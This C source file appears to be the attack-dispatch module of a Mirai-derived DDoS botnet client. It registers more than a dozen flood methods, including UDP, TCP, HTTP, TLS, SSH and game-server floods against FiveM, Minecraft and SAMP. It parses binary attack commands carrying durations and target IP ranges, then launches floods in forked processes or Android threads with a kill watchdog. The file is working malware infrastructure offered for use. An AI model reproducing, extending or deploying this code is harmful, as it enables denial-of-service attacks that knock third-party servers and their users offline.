#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <time.h>
#include <string.h>
#include <sys/wait.h>
#ifdef ANDROID
#include <pthread.h>
#endif

#include "headers/includes.h"
#include "headers/attack.h"
#include "headers/rand.h"
#include "headers/util.h"


uint8_t methods_len = 0;
struct attack_method **methods = NULL;
int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};
static int attack_watchdog[ATTACK_CONCURRENT_MAX] = {0};
volatile time_t g_atk_end_time = 0;

BOOL attack_init(void)
{
    // METHODS UDP //
    add_attack(ATK_VEC_STD, (ATTACK_FUNC)attack_method_std);
    add_attack(ATK_VEC_HEXFLOOD, (ATTACK_FUNC)attack_method_hexflood);
    add_attack(ATK_VEC_STDHEX, (ATTACK_FUNC)attack_method_stdhex);
    add_attack(ATK_VEC_NUDP, (ATTACK_FUNC)attack_method_nudp);
    add_attack(ATK_VEC_UDPHEX, (ATTACK_FUNC)attack_method_udphex);
    add_attack(ATK_VEC_RAW, (ATTACK_FUNC)attack_method_raw);
    add_attack(ATK_VEC_GAME_SAMP, (ATTACK_FUNC)attack_game_samp);
    // TCP
    add_attack(ATK_VEC_TCP, (ATTACK_FUNC)attack_method_tcp);
    add_attack(ATK_VEC_TCP_CONN, (ATTACK_FUNC)attack_method_tcp_conn);
    // HTTP
    add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_method_http);
    // TLS
    add_attack(ATK_VEC_TLS_BOMB, (ATTACK_FUNC)attack_tls_bomb);
    // FiveM
    add_attack(ATK_VEC_FIVEM, (ATTACK_FUNC)attack_fivem);
    // Minecraft
    add_attack(ATK_VEC_MC, (ATTACK_FUNC)attack_mc);
    // SSH
    add_attack(ATK_VEC_SSH, (ATTACK_FUNC)attack_ssh);
    return TRUE;
}

// ─── Kill All Running Attacks ─────────────────────────────
void attack_kill_all(void)
{
    int i, status;
    pid_t pid;

    /* Signal workers that use g_atk_end_time to stop (Android threads + some floods). */
    g_atk_end_time = 1;

#ifndef ANDROID
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] != 0)
        {
#ifdef DEBUG
            printf("[attack] Killing attack PID %d in slot %d\n", attack_ongoing[i], i);
#endif
            kill(attack_ongoing[i], SIGKILL);
            attack_ongoing[i] = 0;
        }
        if (attack_watchdog[i] != 0)
        {
            kill(attack_watchdog[i], SIGKILL);
            attack_watchdog[i] = 0;
        }
    }

    while ((pid = waitpid(-1, &status, WNOHANG)) > 0)
        ;
#endif

    g_atk_end_time = 0;
}

// ─── Parse & Dispatch Attack Command ──────────────────────
void attack_parse(char *buf, int len)
{
    int i;
    uint32_t duration;
    ATTACK_VECTOR vector;
    uint8_t targs_len, opts_len;
    struct attack_target *targs = NULL;
    struct attack_option *opts = NULL;

    if (len < sizeof(uint32_t)) goto cleanup;
    duration = ntohl(*((uint32_t *)buf));
    buf += sizeof(uint32_t);
    len -= sizeof(uint32_t);

    if (len == 0) goto cleanup;
    vector = (ATTACK_VECTOR)*buf++;
    len -= sizeof(uint8_t);

    if (len == 0) goto cleanup;
    targs_len = (uint8_t)*buf++;
    len -= sizeof(uint8_t);
    if (targs_len == 0) goto cleanup;

    if (len < ((sizeof(ipv4_t) + sizeof(uint8_t)) * targs_len))
        goto cleanup;
    targs = calloc(targs_len, sizeof(struct attack_target));
    for (i = 0; i < targs_len; i++)
    {
        targs[i].addr = *((ipv4_t *)buf);
        buf += sizeof(ipv4_t);
        targs[i].netmask = (uint8_t)*buf++;
        len -= (sizeof(ipv4_t) + sizeof(uint8_t));
        targs[i].sock_addr.sin_family = AF_INET;
        targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
        targs[i].sock_addr.sin_port = 0;
    }

    if (len < sizeof(uint8_t)) goto cleanup;
    opts_len = (uint8_t)*buf++;
    len -= sizeof(uint8_t);

    if (opts_len > 0)
    {
        opts = calloc(opts_len, sizeof(struct attack_option));
        for (i = 0; i < opts_len; i++)
        {
            uint8_t val_len;
            if (len < sizeof(uint8_t)) goto cleanup;
            opts[i].key = (uint8_t)*buf++;
            len -= sizeof(uint8_t);
            if (len < sizeof(uint8_t)) goto cleanup;
            val_len = (uint8_t)*buf++;
            len -= sizeof(uint8_t);
            if (len < val_len) goto cleanup;
            opts[i].val = calloc(val_len + 1, sizeof(char));
            util_memcpy(opts[i].val, buf, val_len);
            buf += val_len;
            len -= val_len;
        }
    }

    errno = 0;
    attack_start(duration, vector, targs_len, targs, opts_len, opts);

cleanup:
    if (targs) free(targs);
    if (opts) free_opts(opts, opts_len);
}

#ifdef ANDROID
typedef struct {
    int duration;
    ATTACK_VECTOR vector;
    uint8_t targs_len;
    struct attack_target *targs;
    uint8_t opts_len;
    struct attack_option *opts;
} attack_thread_args;

static void free_attack_thread_args(attack_thread_args *a)
{
    int i;

    if (!a)
        return;
    if (a->targs)
        free(a->targs);
    if (a->opts)
    {
        for (i = 0; i < a->opts_len; i++)
            if (a->opts[i].val)
                free(a->opts[i].val);
        free(a->opts);
    }
    free(a);
}

static void *attack_thread_worker(void *arg)
{
    attack_thread_args *a = (attack_thread_args *)arg;
    int i;

    g_atk_end_time = time(NULL) + a->duration;

    for (i = 0; i < methods_len; i++)
    {
        if (methods[i]->vector == a->vector)
        {
            methods[i]->func(a->targs_len, a->targs, a->opts_len, a->opts);
            break;
        }
    }

    g_atk_end_time = 0;
    free_attack_thread_args(a);
    return NULL;
}
#endif

// ─── Spawn Attack Process / Thread ─────────────────────────
void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len,
                  struct attack_target *targs, uint8_t opts_len,
                  struct attack_option *opts)
{
#ifdef ANDROID
    attack_thread_args *a;
    pthread_t tid;
    pthread_attr_t attr;
    int i;

    if (targs_len == 0)
        return;

    a = calloc(1, sizeof(*a));
    if (!a)
        return;

    a->duration = duration;
    a->vector = vector;
    a->targs_len = targs_len;
    a->opts_len = opts_len;

    a->targs = calloc(targs_len, sizeof(struct attack_target));
    if (!a->targs)
    {
        free_attack_thread_args(a);
        return;
    }
    memcpy(a->targs, targs, targs_len * sizeof(struct attack_target));

    if (opts_len > 0)
    {
        a->opts = calloc(opts_len, sizeof(struct attack_option));
        if (!a->opts)
        {
            free_attack_thread_args(a);
            return;
        }
        for (i = 0; i < opts_len; i++)
        {
            a->opts[i].key = opts[i].key;
            if (opts[i].val)
            {
                int vlen = util_strlen(opts[i].val);
                a->opts[i].val = calloc(vlen + 1, 1);
                if (a->opts[i].val)
                    util_memcpy(a->opts[i].val, opts[i].val, vlen);
            }
        }
    }

    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    if (pthread_create(&tid, &attr, attack_thread_worker, a) != 0)
        free_attack_thread_args(a);
    pthread_attr_destroy(&attr);
#else
    int pid1, pid2, slot = -1;
    int pipefd[2];
    pid_t watchdog_pid = 0;

    /* Reclaim slots whose attack child already exited (SIGCHLD is ignored,
     * so zombies are reaped but attack_ongoing[] was never cleared). */
    for (int i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] != 0 && kill(attack_ongoing[i], 0) == -1)
        {
            if (attack_watchdog[i] != 0)
                kill(attack_watchdog[i], SIGKILL);
            attack_ongoing[i] = 0;
            attack_watchdog[i] = 0;
        }
    }

    for (int i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] == 0)
        {
            slot = i;
            break;
        }
    }
    /* Full: stop previous floods so a new method can run (MAX was historically 1). */
    if (slot == -1)
    {
        attack_kill_all();
        slot = 0;
    }

    if (pipe(pipefd) == -1)
        return;

    pid1 = fork();
    if (pid1 == -1)
    {
        close(pipefd[0]);
        close(pipefd[1]);
#ifdef DEBUG
        printf("[attack] Fork failed: %s\n", strerror(errno));
#endif
        return;
    }
    if (pid1 > 0)
    {
        close(pipefd[1]);
        if (read(pipefd[0], &watchdog_pid, sizeof(watchdog_pid)) != (ssize_t)sizeof(watchdog_pid))
            watchdog_pid = 0;
        close(pipefd[0]);
        attack_ongoing[slot] = pid1;
        attack_watchdog[slot] = (int)watchdog_pid;
        return;
    }

    close(pipefd[0]);
    pid2 = fork();
    if (pid2 == -1)
        exit(EXIT_FAILURE);
    else if (pid2 == 0)
    {
        close(pipefd[1]);
        sleep(duration);
        kill(getppid(), SIGKILL);
        exit(EXIT_SUCCESS);
    }

    write(pipefd[1], &pid2, sizeof(pid2));
    close(pipefd[1]);

    g_atk_end_time = time(NULL) + duration;
    for (int i = 0; i < methods_len; i++)
    {
        if (methods[i]->vector == vector)
        {
            methods[i]->func(targs_len, targs, opts_len, opts);
            break;
        }
    }
    g_atk_end_time = 0;
    exit(EXIT_SUCCESS);
#endif
}

// ─── Option Helpers ────────────────────────────────────────
char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts,
                         uint8_t opt, char *def)
{
    for (int i = 0; i < opts_len; i++)
        if (opts[i].key == opt)
            return opts[i].val;
    return def;
}

int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts,
                       uint8_t opt, int def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);
    return val ? util_atoi(val, 10) : def;
}

uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts,
                           uint8_t opt, uint32_t def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);
    return val ? inet_addr(val) : def;
}

// ─── Internal Helpers ──────────────────────────────────────
static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)
{
    struct attack_method *method = calloc(1, sizeof(struct attack_method));
    method->vector = vector;
    method->func = func;
    methods = realloc(methods, (methods_len + 1) * sizeof(struct attack_method *));
    methods[methods_len++] = method;
}

static void free_opts(struct attack_option *opts, int len)
{
    if (!opts) return;
    for (int i = 0; i < len; i++)
        if (opts[i].val) free(opts[i].val);
    free(opts);
}
